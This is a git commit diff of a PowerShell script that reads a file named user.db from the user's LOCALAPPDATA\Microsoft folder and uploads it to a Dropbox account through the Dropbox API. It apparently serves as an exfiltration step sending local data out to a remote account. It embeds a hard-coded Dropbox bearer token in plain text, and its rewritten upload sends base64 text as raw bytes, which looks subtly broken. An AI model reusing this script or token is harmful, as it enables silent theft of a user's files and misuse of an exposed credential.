bf7c87fd89e50b8341c09feed267d0bee028f1f1
CodingRabbi <50125131+CodingRabbi@users.noreply.github.com>
2023-04-02 01:04:40 -0400

    Update upload_2_db.ps1

--- upload_2_db.ps1
+++ upload_2_db.ps1
@@ -1,18 +1,26 @@
-# Set the path to the file to upload
-$fileToUpload = "$env:LOCALAPPDATA\Microsoft\user.db"
-
-# Set the Dropbox access token
+# Set your access token
 $accessToken = "sl.Bbvw5BqXJMqNcK-5LU1mPMS_Tmk7sGjDbz6f56js_mt7KHtWkjQ8BmLdRlB_g4Y5T1jJlnkLAOnVk4mfZkTArTZQLLfZLCrzD80RUpVk0VvJz_kZPlj99ryk-YN2gCYyx7aUiClOhrak"
 
-# Set the Dropbox API endpoint
-$dropboxApiEndpoint = "https://content.dropboxapi.com/2/files/upload"
+# Set the file path and destination path
+$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
+$destinationPath = "/user.db"
 
-# Set the Dropbox API headers
-$dropboxApiHeaders = @{
+# Read file content as bytes
+$fileContent = Get-Content -Path $filePath -Encoding Byte
+
+# Convert file content to Base64
+$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)
+
+# Prepare headers
+$headers = @{
     "Authorization" = "Bearer $accessToken"
-    "Dropbox-API-Arg" = '{"path":"/user.db","mode":"add","autorename":true,"mute":false}'
+    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
     "Content-Type" = "application/octet-stream"
 }
 
-# Upload the file to Dropbox
-Invoke-RestMethod -Method POST -Uri $dropboxApiEndpoint -Headers $dropboxApiHeaders -InFile $fileToUpload
+# Make the API request
+$apiUrl = "https://content.dropboxapi.com/2/files/upload"
+$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64
+
+# Print response
+Write-Host "File uploaded successfully. Response:" $response
